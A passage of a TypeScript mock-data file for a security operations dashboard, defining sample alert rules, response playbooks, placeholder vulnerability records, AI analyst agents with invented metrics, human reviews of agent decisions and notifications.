    id: 'rule-1',
    name: 'Multiple Failed Login Attempts',
    description: 'Trigger alert when more than 5 failed login attempts occur within 5 minutes',
    isEnabled: true,
    severity: 4,
    category: 'Authentication',
    conditions: [
      {
        field: 'event_type',
        operator: 'equals',
        value: 'failed_login'
      },
      {
        field: 'count',
        operator: 'greater_than',
        value: 5,
        logicOperator: 'AND'
      }
    ],
    actions: [
      {
        type: 'email',
        parameters: { recipients: ['security@company.com'] },
        isEnabled: true
      },
      {
        type: 'create_incident',
        parameters: { severity: 4, category: 'intrusion' },
        isEnabled: false
      }
    ],
    createdBy: 'System Administrator',
    createdAt: new Date('2024-01-01T00:00:00Z'),
    updatedAt: new Date('2024-01-05T00:00:00Z')
  },
  {
    id: 'rule-2',
    name: 'Malware Detection',
    description: 'Create high-severity alert for any malware detection',
    isEnabled: true,
    severity: 5,
    category: 'Malware',
    conditions: [
      {
        field: 'event_type',
        operator: 'equals',
        value: 'malware_detected'
      }
    ],
    actions: [
      {
        type: 'email',
        parameters: { recipients: ['security@company.com', 'it@company.com'] },
        isEnabled: true
      },
      {
        type: 'slack',
        parameters: { channel: '#security-alerts', message: 'URGENT: Malware detected' },
        isEnabled: true
      },
      {
        type: 'create_incident',
        parameters: { severity: 5, category: 'malware' },
        isEnabled: true
      }
    ],
    createdBy: 'Security Team',
    createdAt: new Date('2024-01-01T00:00:00Z'),
    updatedAt: new Date('2024-01-01T00:00:00Z')
  }
];

// Mock Playbooks
export const mockPlaybooks: Playbook[] = [
  {
    id: 'playbook-1',
    name: 'Malware Incident Response',
    description: 'Standard response procedure for malware detection and containment',
    category: 'Incident Response',
    triggerType: 'automatic',
    steps: [
      {
        id: 'step-1',
        name: 'Asset Isolation',
        type: 'automated',
        description: 'Automatically isolate infected asset from network',
        parameters: { isolation_type: 'network', duration: 3600 },
        timeout: 300,
        isRequired: true,
        order: 1
      },
      {
        id: 'step-2',
        name: 'Evidence Collection',
        type: 'automated',
        description: 'Collect memory dump and system artifacts',
        parameters: { collect_memory: true, collect_logs: true },
        timeout: 1800,
        isRequired: true,
        order: 2
      },
      {
        id: 'step-3',
        name: 'Analyst Review',
        type: 'manual',
        description: 'Security analyst reviews evidence and determines next steps',
        parameters: {},
        isRequired: true,
        order: 3
      },
      {
        id: 'step-4',
        name: 'Management Approval',
        type: 'approval',
        description: 'Get management approval for system reimaging',
        parameters: { approvers: ['security-manager'] },
        timeout: 7200,
        isRequired: true,
        order: 4
      },
      {
        id: 'step-5',
        name: 'System Recovery',
        type: 'manual',
        description: 'Reimage system and restore from clean backup',
        parameters: {},
        isRequired: true,
        order: 5
      }
    ],
    isActive: true,
    executionCount: 23,
    successRate: 91,
    averageExecutionTime: 4320, // 72 minutes
    createdBy: 'Security Team',
    createdAt: new Date('2024-01-01T00:00:00Z'),
    updatedAt: new Date('2024-01-10T00:00:00Z')
  },
  {
    id: 'playbook-2',
    name: 'Data Breach Response',
    description: 'Comprehensive response to potential data breach incidents',
    category: 'Incident Response',
    triggerType: 'manual',
    steps: [
      {
        id: 'step-6',
        name: 'Breach Assessment',
        type: 'manual',
        description: 'Assess scope and severity of potential data breach',
        parameters: {},
        isRequired: true,
        order: 1
      },
      {
        id: 'step-7',
        name: 'Legal Notification',
        type: 'manual',
        description: 'Notify legal team and assess regulatory requirements',
        parameters: { contact: 'legal@company.com' },
        isRequired: true,
        order: 2
      },
      {
        id: 'step-8',
        name: 'Containment Actions',
        type: 'automated',
        description: 'Execute containment measures to prevent further exposure',
        parameters: { revoke_credentials: true, block_access: true },
        timeout: 600,
        isRequired: true,
        order: 3
      }
    ],
    isActive: true,
    executionCount: 5,
    successRate: 100,
    averageExecutionTime: 14400, // 4 hours
    createdBy: 'Compliance Team',
    createdAt: new Date('2024-01-01T00:00:00Z'),
    updatedAt: new Date('2024-01-05T00:00:00Z')
  }
];

// Mock Vulnerabilities
export const mockVulnerabilities: Vulnerability[] = [
  {
    id: 'vuln-1',
    cveId: 'CVE-2024-0001',
    title: 'Remote Code Execution in Apache HTTP Server',
    description: 'A buffer overflow vulnerability in Apache HTTP Server allows remote code execution',
    severity: 'critical',
    cvssScore: 9.8,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H',
    affectedAssets: ['asset-2'],
    patchAvailable: true,
    patchReleaseDate: new Date('2024-01-10T00:00:00Z'),
    exploitAvailable: true,
    inTheWild: false,
    publishedDate: new Date('2024-01-05T00:00:00Z'),
    discoveredDate: new Date('2024-01-12T00:00:00Z'),
    status: 'open',
    assignedTo: 'IT Operations',
    dueDate: new Date('2024-01-20T00:00:00Z')
  },
  {
    id: 'vuln-2',
    cveId: 'CVE-2024-0002',
    title: 'Privilege Escalation in Windows Kernel',
    description: 'Local privilege escalation vulnerability in Windows kernel components',
    severity: 'high',
    cvssScore: 7.8,
    cvssVector: 'CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H',
    affectedAssets: ['asset-1', 'asset-4'],
    patchAvailable: true,
    patchReleaseDate: new Date('2024-01-08T00:00:00Z'),
    exploitAvailable: false,
    inTheWild: false,
    publishedDate: new Date('2024-01-03T00:00:00Z'),
    discoveredDate: new Date('2024-01-14T00:00:00Z'),
    status: 'patched',
    assignedTo: 'System Administrator'
  },
  {
    id: 'vuln-3',
    cveId: 'CVE-2023-9999',
    title: 'Information Disclosure in PostgreSQL',
    description: 'Information disclosure vulnerability in PostgreSQL database server',
    severity: 'medium',
    cvssScore: 5.3,
    cvssVector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N',
    affectedAssets: ['asset-5'],
    patchAvailable: false,
    exploitAvailable: false,
    inTheWild: false,
    publishedDate: new Date('2023-12-20T00:00:00Z'),
    discoveredDate: new Date('2024-01-11T00:00:00Z'),
    status: 'mitigated',
    assignedTo: 'Database Team'
  }
];

// Mock AI Agents (based on project.md specifications)
export const mockAIAgents: AIAgent[] = [
  {
    id: 'agent-1',
    name: 'SOC Analyst Agent',
    type: 'soc_analyst',
    status: 'online',
    description: 'Primary functions include alert triage and prioritization, false positive reduction, evidence collection and correlation, initial threat assessment, and escalation recommendations.',
    capabilities: [
      {
        id: 'cap-1',
        name: 'Pattern Recognition',
        description: 'Advanced pattern recognition across historical alerts',
        type: 'analysis',
        enabled: true,
        accuracy: 94.2,
        learningProgress: 87.5
      },
      {
        id: 'cap-2',
        name: 'Context-Aware Severity Scoring',
        description: 'Intelligent severity scoring based on context',
        type: 'analysis',
        enabled: true,
        accuracy: 91.8,
        learningProgress: 82.3
      },
      {
        id: 'cap-3',
        name: 'Automated Evidence Gathering',
        description: 'Automated collection of investigation evidence',
        type: 'automation',
        enabled: true,
        accuracy: 96.1,
        learningProgress: 90.2
      },
      {
        id: 'cap-4',
        name: 'Analyst Feedback Learning',
        description: 'Continuous learning from human analyst feedback',
        type: 'learning',
        enabled: true,
        accuracy: 89.4,
        learningProgress: 75.8
      }
    ],
    primaryFunctions: [
      'Alert triage and prioritization',
      'False positive reduction (target: 60%)',
      'Evidence collection and correlation',
      'Initial threat assessment',
      'Escalation recommendations'
    ],
    metrics: {
      tasksCompleted: 2847,
      tasksInProgress: 23,
      successRate: 94.2,
      averageProcessingTime: 2.3,
      falsePositiveReduction: 62.4,
      learningAccuracy: 91.8,
      uptime: 99.6,
      collaborationScore: 88.7,
      humanFeedbackScore: 4.3
    },
    currentTasks: [
      {
        id: 'task-1',
        title: 'Analyze suspicious login patterns',
        description: 'Investigating multiple failed login attempts from external IPs',
        type: 'alert_triage',
        status: 'processing',
        priority: 3,
        assignedAgent: 'agent-1',
        collaboratingHuman: 'John Smith',
        startTime: new Date(Date.now() - 300000), // 5 minutes ago
        confidence: 87.2,
        humanValidation: false
      },
      {
        id: 'task-2',
        title: 'Correlate network anomalies',
        description: 'Cross-referencing network traffic spikes with security events',
        type: 'investigation',
        status: 'processing',
        priority: 4,
        assignedAgent: 'agent-1',
        startTime: new Date(Date.now() - 900000), // 15 minutes ago
        confidence: 92.5,
        humanValidation: false
      }
    ],
    assignedHumans: ['John Smith', 'Maria Wilson'],
    version: '2.1.4',
    lastUpdated: new Date(Date.now() - 3600000), // 1 hour ago
    createdAt: new Date('2024-01-15T00:00:00Z')
  },
  {
    id: 'agent-2',
    name: 'Incident Response Agent',
    type: 'incident_response',
    status: 'online',
    description: 'Automated incident classification, response plan selection and execution, containment action recommendations, communication coordination, and recovery verification.',
    capabilities: [
      {
        id: 'cap-5',
        name: 'Incident Similarity Matching',
        description: 'Advanced matching of similar historical incidents',
        type: 'analysis',
        enabled: true,
        accuracy: 93.6,
        learningProgress: 85.1
      },
      {
        id: 'cap-6',
        name: 'Dynamic Playbook Adaptation',
        description: 'Real-time adaptation of response playbooks',
        type: 'automation',
        enabled: true,
        accuracy: 88.9,
        learningProgress: 79.3
      },
      {
        id: 'cap-7',
        name: 'Risk Assessment Calculations',
        description: 'Automated business impact and risk calculations',
        type: 'analysis',
        enabled: true,
        accuracy: 91.2,
        learningProgress: 83.7
      },
      {
        id: 'cap-8',
        name: 'Automated Decision Trees',
        description: 'Intelligent decision-making for response actions',
        type: 'automation',
        enabled: true,
        accuracy: 86.4,
        learningProgress: 76.9
      }
    ],
    primaryFunctions: [
      'Automated incident classification',
      'Response plan selection and execution',
      'Containment action recommendations',
      'Communication coordination',
      'Recovery verification'
    ],
    metrics: {
      tasksCompleted: 1923,
      tasksInProgress: 8,
      successRate: 91.7,
      averageProcessingTime: 8.7,
      learningAccuracy: 89.2,
      uptime: 98.9,
      collaborationScore: 92.1,
      humanFeedbackScore: 4.5
    },
    currentTasks: [
      {
        id: 'task-3',
        title: 'Execute malware containment playbook',
        description: 'Automated containment for detected malware on workstation WS-047',
        type: 'incident_response',
        status: 'processing',
        priority: 5,
        assignedAgent: 'agent-2',
        collaboratingHuman: 'Maria Wilson',
        startTime: new Date(Date.now() - 600000), // 10 minutes ago
        confidence: 95.8,
        humanValidation: true
      }
    ],
    assignedHumans: ['Maria Wilson', 'System Administrator'],
    version: '1.8.2',
    lastUpdated: new Date(Date.now() - 1800000), // 30 minutes ago
    createdAt: new Date('2024-01-20T00:00:00Z')
  },
  {
    id: 'agent-3',
    name: 'Threat Intelligence Agent',
    type: 'threat_intel',
    status: 'online',
    description: 'IOC enrichment and validation, threat actor attribution, campaign correlation, intelligence report generation, and feed management.',
    capabilities: [
      {
        id: 'cap-9',
        name: 'Threat Landscape Analysis',
        description: 'Comprehensive analysis of global threat landscape',
        type: 'analysis',
        enabled: true,
        accuracy: 96.3,
        learningProgress: 91.4
      },
      {
        id: 'cap-10',
        name: 'Attribution Pattern Matching',
        description: 'Advanced threat actor attribution based on TTPs',
        type: 'analysis',
        enabled: true,
        accuracy: 87.9,
        learningProgress: 84.2
      },
      {
        id: 'cap-11',
        name: 'Intelligence Source Correlation',
        description: 'Cross-correlation of multiple intelligence sources',
        type: 'automation',
        enabled: true,
        accuracy: 94.7,
        learningProgress: 88.6
      },
      {
        id: 'cap-12',
        name: 'Predictive Threat Modeling',
        description: 'Predictive models for emerging threat trends',
        type: 'prediction',
        enabled: true,
        accuracy: 82.1,
        learningProgress: 69.8
      }
    ],
    primaryFunctions: [
      'IOC enrichment and validation',
      'Threat actor attribution',
      'Campaign correlation',
      'Intelligence report generation',
      'Feed management'
    ],
    metrics: {
      tasksCompleted: 4521,
      tasksInProgress: 15,
      successRate: 96.1,
      averageProcessingTime: 3.2,
      learningAccuracy: 92.7,
      uptime: 99.8,
      collaborationScore: 89.4,
      humanFeedbackScore: 4.7
    },
    currentTasks: [
      {
        id: 'task-4',
        title: 'Enrich suspicious domain IOCs',
        description: 'Analyzing and enriching newly discovered suspicious domains',
        type: 'threat_analysis',
        status: 'processing',
        priority: 3,
        assignedAgent: 'agent-3',
        startTime: new Date(Date.now() - 420000), // 7 minutes ago
        confidence: 94.3,
        humanValidation: false
      },
      {
        id: 'task-5',
        title: 'APT28 campaign correlation',
        description: 'Correlating recent activities with known APT28 campaigns',
        type: 'threat_analysis',
        status: 'processing',
        priority: 4,
        assignedAgent: 'agent-3',
        collaboratingHuman: 'John Smith',
        startTime: new Date(Date.now() - 1200000), // 20 minutes ago
        confidence: 89.7,
        humanValidation: true
      }
    ],
    assignedHumans: ['John Smith'],
    version: '3.0.1',
    lastUpdated: new Date(Date.now() - 900000), // 15 minutes ago
    createdAt: new Date('2024-01-10T00:00:00Z')
  },
  {
    id: 'agent-4',
    name: 'Report Generation Agent',
    type: 'report_generation',
    status: 'online',
    description: 'Automated report generation, metrics calculation and trending, executive summary creation, compliance reporting, and performance analytics.',
    capabilities: [
      {
        id: 'cap-13',
        name: 'Natural Language Report Writing',
        description: 'Professional report generation in natural language',
        type: 'automation',
        enabled: true,
        accuracy: 93.8,
        learningProgress: 86.9
      },
      {
        id: 'cap-14',
        name: 'Data Visualization Recommendations',
        description: 'Intelligent recommendations for data visualization',
        type: 'analysis',
        enabled: true,
        accuracy: 88.6,
        learningProgress: 81.4
      },
      {
        id: 'cap-15',
        name: 'Trend Analysis and Forecasting',
        description: 'Advanced trend analysis with forecasting capabilities',
        type: 'prediction',
        enabled: true,
        accuracy: 85.2,
        learningProgress: 77.3
      },
      {
        id: 'cap-16',
        name: 'Anomaly Highlighting',
        description: 'Automatic highlighting of significant anomalies',
        type: 'analysis',
        enabled: true,
        accuracy: 91.4,
        learningProgress: 84.1
      }
    ],
    primaryFunctions: [
      'Automated report generation',
      'Metrics calculation and trending',
      'Executive summary creation',
      'Compliance reporting',
      'Performance analytics'
    ],
    metrics: {
      tasksCompleted: 987,
      tasksInProgress: 5,
      successRate: 97.3,
      averageProcessingTime: 12.4,
      learningAccuracy: 94.1,
      uptime: 99.2,
      collaborationScore: 85.6,
      humanFeedbackScore: 4.2
    },
    currentTasks: [
      {
        id: 'task-6',
        title: 'Generate weekly security summary',
        description: 'Compiling weekly security posture summary for executive team',
        type: 'report_generation',
        status: 'processing',
        priority: 2,
        assignedAgent: 'agent-4',
        startTime: new Date(Date.now() - 1800000), // 30 minutes ago
        confidence: 96.7,
        humanValidation: false
      }
    ],
    assignedHumans: ['System Administrator'],
    version: '1.5.7',
    lastUpdated: new Date(Date.now() - 2700000), // 45 minutes ago
    createdAt: new Date('2024-01-25T00:00:00Z')
  }
];

// Mock Agent Activities
export const mockAgentActivities: AgentActivity[] = [
  {
    id: 'activity-1',
    agent_id: 'agent-1',
    agentName: 'SOC Analyst Agent',
    activityType: 'task_completed',
    title: 'Alert triage completed',
    description: 'Successfully triaged 47 alerts, identified 3 high-priority threats',
    metadata: {
      alertsProcessed: 47,
      highPriority: 3,
      falsePositives: 29,
      accuracy: 94.7
    },
    timestamp: new Date(Date.now() - 600000).toISOString(), // 10 minutes ago
    impact: 'high',
    humanInvolved: 'John Smith'
  },
  {
    id: 'activity-2',
    agent_id: 'agent-2',
    agentName: 'Incident Response Agent',
    activityType: 'collaboration',
    title: 'Containment action approved',
    description: 'Human analyst approved automated containment for malware incident INC-2024-0156',
    metadata: {
      incidentId: 'INC-2024-0156',
      actionType: 'containment',
      approvalTime: '2.3 minutes'
    },
    timestamp: new Date(Date.now() - 900000).toISOString(), // 15 minutes ago
    impact: 'high',
    humanInvolved: 'Maria Wilson'
  },
  {
    id: 'activity-3',
    agent_id: 'agent-3',
    agentName: 'Threat Intelligence Agent',
    activityType: 'learning_update',
    title: 'IOC enrichment accuracy improved',
    description: 'Learning model updated based on analyst feedback, accuracy increased to 96.3%',
    metadata: {
      previousAccuracy: 94.1,
      newAccuracy: 96.3,
      improvementSource: 'analyst_feedback',
      samplesProcessed: 1247
    },
    timestamp: new Date(Date.now() - 1200000).toISOString(), // 20 minutes ago
    impact: 'medium',
    humanInvolved: 'John Smith'
  },
  {
    id: 'activity-4',
    agent_id: 'agent-4',
    agentName: 'Report Generation Agent',
    activityType: 'task_completed',
    title: 'Executive report generated',
    description: 'Monthly executive security report generated and delivered',
    metadata: {
      reportType: 'executive_monthly',
      pages: 12,
      charts: 8,
      recommendations: 5
    },
    timestamp: new Date(Date.now() - 1800000).toISOString(), // 30 minutes ago
    impact: 'medium'
  },
  {
    id: 'activity-5',
    agent_id: 'agent-1',
    agentName: 'SOC Analyst Agent',
    activityType: 'error',
    title: 'False positive detected',
    description: 'Agent incorrectly classified legitimate admin activity as suspicious',
    metadata: {
      errorType: 'false_positive',
      alertId: 'ALT-2024-8934',
      correctedBy: 'Maria Wilson'
    },
    timestamp: new Date(Date.now() - 2400000).toISOString(), // 40 minutes ago
    impact: 'low',
    humanInvolved: 'Maria Wilson'
  }
];

// Mock SOC Teams
export const mockSOCTeams: SOCTeam[] = [
  {
    id: 'team-1',
    name: 'Primary SOC Team',
    humanAnalysts: ['John Smith', 'Maria Wilson'],
    aiAgents: ['agent-1', 'agent-2'],
    specialization: 'general',
    performance: {
      collaborationEfficiency: 92.3,
      taskCompletionRate: 96.7,
      averageResponseTime: 4.2,
      humanSatisfactionScore: 4.4,
      aiAccuracyImprovement: 18.7
    },
    currentWorkload: 67,
    maxWorkload: 100
  },
  {
    id: 'team-2',
    name: 'Threat Intelligence Team',
    humanAnalysts: ['John Smith'],
    aiAgents: ['agent-3'],
    specialization: 'threat_hunting',
    performance: {
      collaborationEfficiency: 89.1,
      taskCompletionRate: 94.2,
      averageResponseTime: 6.8,
      humanSatisfactionScore: 4.6,
      aiAccuracyImprovement: 22.4
    },
    currentWorkload: 45,
    maxWorkload: 80
  },
  {
    id: 'team-3',
    name: 'Management Reporting Team',
    humanAnalysts: ['System Administrator'],
    aiAgents: ['agent-4'],
    specialization: 'general',
    performance: {
      collaborationEfficiency: 87.6,
      taskCompletionRate: 98.1,
      averageResponseTime: 15.2,
      humanSatisfactionScore: 4.2,
      aiAccuracyImprovement: 15.9
    },
    currentWorkload: 23,
    maxWorkload: 50
  }
];

// Mock AI False Positive Events
export const mockFalsePositiveEvents: AIFalsePositiveEvent[] = [
  {
    id: 'fp-event-1',
    alertId: 'ALT-2024-1234',
    agent_id: 'agent-1',
    agentName: 'SOC Analyst Agent',
    agentDecision: 'false_positive',
    agentConfidence: 87.3,
    agentReasoning: 'Detected pattern matches legitimate administrative PowerShell activity during maintenance window. User account has elevated privileges and activity occurred within scheduled maintenance timeframe.',
    humanReview: {
      id: 'review-1',
      reviewerId: '2',
      reviewerName: 'John Smith',
      humanDecision: 'agree_false_positive',
      confidence: 95,
      reasoning: 'Confirmed legitimate admin activity. PowerShell commands were part of scheduled system updates. User authentication logs show normal pattern.',
      feedbackCategory: 'accurate',
      suggestedImprovements: 'Agent correctly identified context clues. Good analysis.',
      additionalContext: 'This type of activity is common during maintenance windows.',
      reviewTime: 180, // 3 minutes
      reviewedAt: new Date(Date.now() - 3600000) // 1 hour ago
    },
    eventDetails: {
      alertTitle: 'Suspicious PowerShell Execution Detected',
      alertSeverity: 3,
      sourceSystem: 'Windows Event Log',
      eventTime: new Date(Date.now() - 7200000), // 2 hours ago
      assetName: 'SRV-DC-01'
    },
    status: 'reviewed',
    createdAt: new Date(Date.now() - 7200000),
    updatedAt: new Date(Date.now() - 3600000)
  },
  {
    id: 'fp-event-2',
    alertId: 'ALT-2024-1235',
    agent_id: 'agent-1',
    agentName: 'SOC Analyst Agent',
    agentDecision: 'true_positive',
    agentConfidence: 92.8,
    agentReasoning: 'Multiple failed authentication attempts from unusual source IP address. Geolocation shows access from different country than user\'s typical location. Brute force attack pattern detected.',
    humanReview: {
      id: 'review-2',
      reviewerId: '3',
      reviewerName: 'Maria Wilson',
      humanDecision: 'disagree',
      confidence: 88,
      reasoning: 'User is currently traveling for business. IT department was notified of travel. VPN logs confirm legitimate remote access attempt with temporary connection issues.',
      feedbackCategory: 'missing_context',
      suggestedImprovements: 'Agent should integrate travel notifications and IT service desk tickets for better context.',
      additionalContext: 'Need to improve correlation with HR travel data and IT notifications.',
      reviewTime: 420, // 7 minutes
      reviewedAt: new Date(Date.now() - 1800000) // 30 minutes ago
    },
    eventDetails: {
      alertTitle: 'Brute Force Authentication Attack',
      alertSeverity: 4,
      sourceSystem: 'VPN Gateway',
      eventTime: new Date(Date.now() - 3600000), // 1 hour ago
      assetName: 'VPN-GW-01'
    },
    status: 'disputed',
    createdAt: new Date(Date.now() - 3600000),
    updatedAt: new Date(Date.now() - 1800000)
  },
  {
    id: 'fp-event-3',
    alertId: 'ALT-2024-1236',
    agent_id: 'agent-2',
    agentName: 'Incident Response Agent',
    agentDecision: 'needs_investigation',
    agentConfidence: 76.2,
    agentReasoning: 'Unusual network traffic pattern detected with data exfiltration characteristics. However, traffic occurs during backup window. Requires human analysis to determine if legitimate backup or potential data theft.',
    humanReview: {
      id: 'review-3',
      reviewerId: '2',
      reviewerName: 'John Smith',
      humanDecision: 'agree_false_positive',
      confidence: 92,
      reasoning: 'Confirmed as scheduled backup to cloud storage. Traffic pattern matches expected backup behavior. Cloud destination is approved vendor.',
      feedbackCategory: 'partially_accurate',
      suggestedImprovements: 'Good recognition of suspicious pattern, but needs better integration with backup schedule data.',
      additionalContext: 'Backup schedules and approved cloud destinations should be in agent knowledge base.',
      reviewTime: 300, // 5 minutes
      reviewedAt: new Date(Date.now() - 900000) // 15 minutes ago
    },
    eventDetails: {
      alertTitle: 'Potential Data Exfiltration Activity',
      alertSeverity: 5,
      sourceSystem: 'Network IDS',
      eventTime: new Date(Date.now() - 5400000), // 1.5 hours ago
      assetName: 'DB-SERVER-02'
    },
    status: 'reviewed',
    createdAt: new Date(Date.now() - 5400000),
    updatedAt: new Date(Date.now() - 900000)
  },
  {
    id: 'fp-event-4',
    alertId: 'ALT-2024-1237',
    agent_id: 'agent-3',
    agentName: 'Threat Intelligence Agent',
    agentDecision: 'true_positive',
    agentConfidence: 94.1,
    agentReasoning: 'IP address matches known botnet C2 infrastructure. Domain has suspicious registration patterns and recent malware campaign associations. High confidence threat indicator.',
    eventDetails: {
      alertTitle: 'Communication with Known Malicious IP',
      alertSeverity: 4,
      sourceSystem: 'Proxy Logs',
      eventTime: new Date(Date.now() - 600000), // 10 minutes ago
      assetName: 'WS-USER-42'
    },
    status: 'pending_review',
    createdAt: new Date(Date.now() - 600000),
    updatedAt: new Date(Date.now() - 600000)
  },
  {
    id: 'fp-event-5',
    alertId: 'ALT-2024-1238',
    agent_id: 'agent-1',
    agentName: 'SOC Analyst Agent',
    agentDecision: 'false_positive',
    agentConfidence: 83.7,
    agentReasoning: 'File hash matches known legitimate software signature. Execution from standard program directory with valid certificate. Behavioral analysis shows normal application patterns.',
    humanReview: {
      id: 'review-5',
      reviewerId: '3',
      reviewerName: 'Maria Wilson',
      humanDecision: 'needs_more_info',
      confidence: 65,
      reasoning: 'While file appears legitimate, execution time and user context seem unusual. Need to investigate user behavior patterns and business justification.',
      feedbackCategory: 'partially_accurate',
      suggestedImprovements: 'Good technical analysis but needs more behavioral context about user activities.',
      additionalContext: 'Should correlate with user role, typical software usage, and business processes.',
      reviewTime: 480, // 8 minutes
      reviewedAt: new Date(Date.now() - 300000) // 5 minutes ago
    },
    eventDetails: {
      alertTitle: 'Potentially Malicious File Execution',
      alertSeverity: 3,
      sourceSystem: 'Endpoint Detection',
      eventTime: new Date(Date.now() - 1200000), // 20 minutes ago
      assetName: 'WS-FINANCE-12'
    },
    status: 'reviewed',
    createdAt: new Date(Date.now() - 1200000),
    updatedAt: new Date(Date.now() - 300000)
  }
];

// Mock AI Decision Insights
export const mockAIDecisionInsights: AIDecisionInsight[] = [
  {
    id: 'insight-1',
    alertId: 'ALT-2024-1234',
    agent_id: 'agent-1',
    agentName: 'SOC Analyst Agent',
    decisionType: 'alert_classification',
    aiDecision: 'False Positive - Legitimate Administrative Activity',
    confidence: 87.3,
    reasoning: 'Analysis based on temporal patterns, user privileges, and system context indicates legitimate administrative activity during maintenance window.',
    evidenceUsed: [
      'User has domain administrator privileges',
      'Activity occurred within scheduled maintenance window (02:00-04:00)',
      'PowerShell commands match standard system update procedures',
      'No unusual network connections detected',
      'Authentication logs show normal pattern'
    ],
    alternativeOptions: [
      {
        option: 'True Positive - Suspicious Activity',
        confidence: 12.7,
        reasoning: 'PowerShell execution during off-hours could indicate compromise'
      }
    ],
    modelVersion: 'v2.3.1',
    processingTime: 245, // milliseconds
    createdAt: new Date(Date.now() - 7200000)
  },
  {
    id: 'insight-2',
    alertId: 'ALT-2024-1235',
    agent_id: 'agent-1',
    agentName: 'SOC Analyst Agent',
    decisionType: 'threat_detection',
    aiDecision: 'True Positive - Brute Force Attack',
    confidence: 92.8,
    reasoning: 'Multiple authentication failures from foreign IP address with no prior access history suggests automated attack.',
    evidenceUsed: [
      'Failed authentication attempts: 47 in 10 minutes',
      'Source IP geolocation: Different country from user baseline',
      'No previous successful access from this IP range',
      'Attack pattern matches known brute force signatures',
      'User account shows normal activity from different location'
    ],
    alternativeOptions: [
      {
        option: 'False Positive - Legitimate Remote Access',
        confidence: 7.2,
        reasoning: 'Could be user traveling with connection issues'
      }
    ],
    modelVersion: 'v2.3.1',
    processingTime: 312,
    humanOverride: {
      overriddenBy: 'Maria Wilson',
      newDecision: 'False Positive - Business Travel',
      reason: 'User travel notification confirmed with HR. IT was aware of potential connection issues.',
      timestamp: new Date(Date.now() - 1800000)
    },
    createdAt: new Date(Date.now() - 3600000)
  },
  {
    id: 'insight-3',
    alertId: 'ALT-2024-1236',
    agent_id: 'agent-2',
    agentName: 'Incident Response Agent',
    decisionType: 'risk_assessment',
    aiDecision: 'Medium Risk - Requires Investigation',
    confidence: 76.2,
    reasoning: 'Unusual data transfer patterns during backup window present ambiguous threat profile requiring human analysis.',
    evidenceUsed: [
      'Large data transfer detected: 2.3GB in 15 minutes',
      'Transfer occurred during backup window',
      'Destination IP matches cloud storage patterns',
      'No malware signatures in transferred data',
      'User account has data access privileges'
    ],
    alternativeOptions: [
      {
        option: 'High Risk - Data Exfiltration',
        confidence: 15.8,
        reasoning: 'Transfer volume and timing could indicate data theft'
      },
      {
        option: 'Low Risk - Normal Backup Activity',
        confidence: 8.0,
        reasoning: 'Matches expected backup behavior patterns'
      }
    ],
    modelVersion: 'v2.2.8',
    processingTime: 156,
    createdAt: new Date(Date.now() - 5400000)
  }
];

// Mock Notifications
export const mockNotifications: Notification[] = [
  {
    id: 'notif-1',
    title: 'Critical Alert: Malware Detected',
    message: 'Multiple malware signatures detected on DC-SERVER-01. Immediate attention required.',
    type: 'alert',
    priority: 'critical',
    isRead: false,
    actionRequired: true,
    relatedId: 'ALT-2024-1234',
    relatedType: 'alert',
    createdAt: new Date(Date.now() - 300000), // 5 minutes ago
    expiresAt: new Date(Date.now() + 3600000) // 1 hour from now
  },
  {
    id: 'notif-2',
    title: 'Incident Escalated',
    message: 'INC-2024-0045 has been escalated to level 3. Security team response initiated.',
    type: 'incident',
    priority: 'high',
    isRead: false,
    actionRequired: true,
    relatedId: 'INC-2024-0045',
    relatedType: 'incident',
    createdAt: new Date(Date.now() - 900000), // 15 minutes ago
  },
  {
    id: 'notif-3',
    title: 'System Maintenance Scheduled',
    message: 'Scheduled maintenance window for threat intelligence feeds starts in 2 hours.',
    type: 'system',
    priority: 'medium',
    isRead: false,
    actionRequired: false,
    createdAt: new Date(Date.now() - 1800000), // 30 minutes ago
    expiresAt: new Date(Date.now() + 7200000) // 2 hours from now
  },
  {
    id: 'notif-4',
    title: 'New Threat Intelligence',
    message: '47 new IOCs added from threat intelligence feeds. Review recommended.',
    type: 'security',
    priority: 'medium',
    isRead: true,
    actionRequired: false,
    createdAt: new Date(Date.now() - 3600000), // 1 hour ago
  },
  {
    id: 'notif-5',
    title: 'User Access Review Required',
    message: 'Quarterly access review for admin users is due. Please review user permissions.',
    type: 'security',
    priority: 'medium',
    isRead: false,
    actionRequired: true,
    createdAt: new Date(Date.now() - 5400000), // 1.5 hours ago
    expiresAt: new Date(Date.now() + 604800000) // 1 week from now
  },
  {
    id: 'notif-6',
    title: 'AI Agent Performance Update',
    message: 'SOC Analyst Agent achieved 94.2% accuracy this week. Performance report available.',
    type: 'info',
    priority: 'low',
    isRead: true,
    actionRequired: false,
    createdAt: new Date(Date.now() - 7200000), // 2 hours ago
  },
  {
    id: 'notif-7',
    title: 'Failed Login Attempts',
    message: '15 failed login attempts detected for user john.smith from suspicious IP addresses.',
    type: 'security',
    priority: 'high',
    isRead: false,
    actionRequired: true,
    relatedId: 'user-2',
    relatedType: 'user',
    createdAt: new Date(Date.now() - 10800000), // 3 hours ago
  },
  {
    id: 'notif-8',
    title: 'Asset Vulnerability Scan Complete',
    message: 'Vulnerability scan completed for 245 assets. 12 critical vulnerabilities found.',
    type: 'security',
    priority: 'high',
    isRead: true,
    actionRequired: true,
    createdAt: new Date(Date.now() - 14400000), // 4 hours ago
  },
  {
    id: 'notif-9',
    title: 'Backup Verification Failed',
    message: 'Automated backup verification failed for security logs. Manual verification needed.',
    type: 'system',
    priority: 'medium',
    isRead: false,
    actionRequired: true,
    createdAt: new Date(Date.now() - 18000000), // 5 hours ago
  },
  {
    id: 'notif-10',
    title: 'Monthly Security Report Ready',
    message: 'October 2024 security report has been generated and is available for review.',
    type: 'info',
    priority: 'low',
    isRead: true,
    actionRequired: false,
    createdAt: new Date(Date.now() - 86400000), // 1 day ago
  }
];